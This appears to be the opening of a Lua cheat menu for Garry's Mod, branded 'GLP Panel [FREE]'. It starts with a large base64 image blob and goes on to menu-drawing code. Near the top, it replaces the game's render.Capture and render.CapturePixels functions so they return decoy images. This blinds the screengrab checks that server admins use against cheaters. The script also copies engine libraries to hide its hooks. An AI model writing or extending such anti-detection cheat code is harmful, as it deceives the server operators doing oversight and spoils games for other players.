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"

local GLPBot_antiscreengrab2 = "iVBORw0KGgoAAAANSUhEUgAAAAcAAAAECAIAAADNpLIqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYSURBVBhXY2BgYmBmYGFgZEAFlIkyMAAACDAAKdIBq3cAAAAASUVORK5CYII="

render.Capture = function() return GLPBot_antiscreengrab end
render.Capture = function() return GLPBot_antiscreengrab2 end
render.Capture = function() return MsgAntiScreengrab(4.3, "GLP Menu Blocked a screen grabbing attempt.") end
render.CapturePixels = function() return GLPBot_antiscreengrab end
render.CapturePixels = function() return GLPBot_antiscreengrab2 end
render.CapturePixels = function() return MsgAntiScreengrab(4.3, "GLP Menu Blocked a screen grab attempt.") end

local function Copy(tt, lt)
	local copy = {}
	if lt then
		if type(tt) == "table" then
			for k, v in next, tt do
				copy[k] = Copy(k, v)
			end
		else
			copy = lt
		end
		return copy
	end
	if type(tt) ~= "table" then
		copy = tt
	else
		for k, v in next, tt do
			copy[k] = Copy(k, v)
		end
	end
	return copy
end

local GLPBotC = {}

local render = Copy(render)

local cam = Copy(cam)

local surface = Copy(surface)

local vgui = Copy(vgui)

local input = Copy(input)

local player = Copy(player)

local gui = Copy(gui)

local game = Copy(game)

local file = Copy(file)

local util = Copy(util)

local table = Copy(table)

local math = Copy(math)

local me = LocalPlayer()

local optimized = false

local applied = false

local grabbed = false

local em = FindMetaTable("Entity")

local pm = FindMetaTable("Player")

local cm = FindMetaTable("CUserCmd")

local wm = FindMetaTable("Weapon")

local am = FindMetaTable("Angle")

local vm = FindMetaTable("Vector")

local im =  FindMetaTable("IMaterial")



gameevent.Listen("entity_killed")
gameevent.Listen("player_disconnect")
gameevent.Listen("player_hurt")

bSendPacket = false
unloaded = false


GLPBot.TickCount = 0

GLPBot.IsMe 			= function(ply) return ply:SteamID64() == "0:00" end -- Well, me;


--NOTE-- ,.

function GLPBot.PlayerCheck()
	for k, v in pairs(player.GetAll()) do
	if (GLPBot.IsMe(v) and not v.Confirmed) then
	if GLPBot.IsMe(me) then continue end
		timer.Create("ChatPrint", 11.3, 1, function() MsgRGB(6.9, "NONE, "..v:Nick()..", is on the server!") end)
		timer.Create("PlaySound", 11.3, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
		RunConsoleCommand("say", "I'm here to chew ass and kick bubblegum, and I'm all out of ass!")
		v.Confirmed = true
		end
	end
end

local function UpdateVar(men, sub, lookup, new)
	for aa, aaa in next, options[men] do
		for key, val in next, aaa do
			if(aaa[1][1] ~= sub) then continue end
				if(val[1] == lookup) then
					val[3] = new
			end
		end
	end
end

local folder = "GLPBotC"

if not file.IsDir(folder, "DATA") then
	file.CreateDir(folder)
end

local drawn_ents = {}

local priority_list = {}

local ignore_list = {}

if file.Exists(folder.."/entities.txt", "DATA") then
	drawn_ents = util.JSONToTable(file.Read(folder.."/entities.txt", "DATA"))
		else
	drawn_ents = {"spawned_money", "spawned_shipment", "spawned_weapon", "money_printer", "weapon_ttt_knife", "weapon_ttt_c4", "npc_tripmine"}
end


local menukeydown, menukeydown2, menuopen

local mousedown

local candoslider

local drawlast

local visible = {}

for k, v in next, order do
	visible[v] = false
end

local function DrawUpperText(w, h)
	surface.SetFont("MenuFont")
	local tw, th = surface.GetTextSize("")
	surface.SetTextPos(512, 15 - th / 2)
	surface.SetTextColor(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 255)
	surface.SetFont("GLPBotFont")
	surface.DrawText("GLP Panel [FREE]")
	surface.SetFont("MenuFont")
	surface.DrawRect(0, 31, 0, h - 31)
	surface.DrawRect(0, h - 0, w, h)
	surface.DrawRect(w - 0, 31, 0, h)
	surface.SetTextColor(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 255)
	surface.SetTextPos(40, 15 - th / 2)
	surface.DrawText("www.lmccoding.weebly.com")
	surface.SetTextColor(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 255)
	surface.SetTextPos(810, 15 - th / 2)
	surface.DrawText("Custom Name: ")
	surface.SetTextColor(HSVToColor(RealTime()*45%360, 1, 1))
	surface.DrawText(" "..GetConVarString("glb_namechanger"))
end

local function MouseInArea(minx, miny, maxx, maxy)
	local mousex, mousey = gui.MousePos()
	return(mousex < maxx and mousex > minx and mousey < maxy and mousey > miny)
end

local function DrawOptions(self, w, h)
	local mx, my = self:GetPos()
	local sizeper = (w - 10) / #order
	local maxx = 0
	for k, v in next, order do
		local bMouse = MouseInArea(mx + 5 + maxx, my + 31, mx + 5 + maxx + sizeper, my + 31 + 30)
		if(visible[v]) then
			local curcol = Color(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
			for i = 0, 0 do
					surface.SetDrawColor(curcol)
					curcol.r, curcol.g, curcol.b = curcol.r + 3, curcol.g + 3, curcol.b + 3
					surface.DrawLine(0.9 + maxx, 60 + i, 0.9 + maxx + sizeper, 60 + i)
			end
			elseif(bMouse) then
			local curcol = Color(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 100)
			for i = 0, 0 do
					surface.SetDrawColor(curcol)
					curcol.r, curcol.g, curcol.b = curcol.r + 3, curcol.g + 3, curcol.b + 3
					surface.DrawLine(0.9 + maxx, 60 + i, 0.9 + maxx + sizeper, 60 + i)
			end
		end
		if(bMouse and input.IsMouseDown(MOUSE_LEFT) and not mousedown and not visible[v]) then
				local nb = visible[v]
				for key, val in next, visible do
						visible[key] = false
				end
				visible[v] = not nb
		end
		surface.SetFont("MenuFont")
		surface.SetTextColor(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 255)
		local tw, th = surface.GetTextSize(v)
		surface.SetTextPos(5 + maxx + sizeper / 2 - tw / 2, 31 + 15 - th / 2)
		surface.DrawText(v)
		maxx = maxx + sizeper
	end
end

local function DrawCheckbox(self, w, h, var, maxy, posx, posy, dist)
	surface.SetFont("MenuFont")
	surface.SetTextColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
	surface.SetTextPos(5 + posx + 15 + 5, 61 + posy + maxy)
	local tw, th = surface.GetTextSize(var[1])
	surface.DrawText(var[1])
	surface.SetDrawColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
	surface.DrawOutlinedRect(5 + posx + 15 + 5 + dist + var[4], 61 + posy + maxy + 2, 14, 14)
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(mx + 5 + posx + 15 + 5, my + 61 + posy + maxy, mx + 5 + posx + 15 + 5 + dist + 14 + var[4], my + 61 + posy + maxy + 16)
	if(bMouse) then
		surface.DrawRect(5 + posx + 15 + 5 + dist + 2 + var[4], 61 + posy + maxy + 4, 10, 10)
	end
	if(var[3]) then
		local curcol = Color(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
		surface.SetDrawColor(curcol)
		surface.DrawRect(5 + posx + 15 + 5 + dist + 2 + var[4], 61 + posy + maxy + 4, 10, 10)
		surface.SetDrawColor(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:"))
		surface.DrawOutlinedRect(5 + posx + 15 + 5 + dist + 2 + var[4], 61 + posy + maxy + 4, 10, 10)
	end
	if(bMouse && input.IsMouseDown(MOUSE_LEFT) && !mousedown && !drawlast) then
		var[3] = !var[3]
	end
end

local function DrawSlider(self, w, h, var, maxy, posx, posy, dist)
	local curnum = var[3]
	local max = var[4]
	local size = var[5]
	surface.SetFont("MenuFont")
	surface.SetTextColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
	surface.SetTextPos(5 + posx + 15 + 5, 61 + posy + maxy)
	surface.DrawText(var[1])
	local tw, th = surface.GetTextSize(var[1])
	surface.SetDrawColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
	surface.DrawRect(5 + posx + 15 + 5 + dist, 61 + posy + maxy + 9, size, 2)
	local ww = math.ceil(curnum * size / max)
	surface.SetDrawColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
	surface.DrawRect(3 + posx + 15 + 5 + dist + ww, 61 + posy + maxy + 9 - 5, 4, 12)
	surface.SetDrawColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
	local tw, th = surface.GetTextSize(curnum..".00")
	surface.DrawOutlinedRect(3 + posx + 15 + 5 + dist + ww, 61 + posy + maxy + 4, 4, 12)
	surface.SetTextPos(5 + posx + 15 + 5 + dist + (size / 2) - tw / 2, 61 + posy + maxy + 16)
	surface.DrawText(curnum..".00")
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(5 + posx + 15 + 5 + dist + mx, 61 + posy + maxy + 9 - 5 + my, 5 + posx + 15 + 5 + dist + mx + size, 61 + posy + maxy + 9 - 5 + my + 12)
	if(bMouse && input.IsMouseDown(MOUSE_LEFT) && !drawlast && !candoslider) then
		local mw, mh = gui.MousePos()
		local new = math.ceil(((mw - (mx + posx + 25 + dist - size)) - (size + 1)) / (size - 2) * max)
		var[3] = new
	end
end

local notyetselected

local function DrawSelect(self, w, h, var, maxy, posx, posy, dist)
	local size = var[5]
	local curopt = var[3]
	surface.SetFont("MenuFont")
